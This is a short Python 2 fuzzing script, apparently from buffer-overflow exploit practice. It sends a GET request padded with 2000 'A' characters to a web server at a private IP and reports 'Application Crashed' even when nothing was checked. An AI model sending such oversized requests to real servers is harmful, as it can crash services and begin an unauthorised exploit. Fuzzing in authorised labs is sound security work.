#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
payload = "A"*2000
method="GET"
protocol=" HTTP/1.1\r\n\r\n"
buffer=method+payload+ protocol
try:
    print "Fuzzing "
    s.connect(('192.168.31.138',80))
    s.send(buffer)
    print "Application Crashed"
except:
    print"Failed Fuzzing"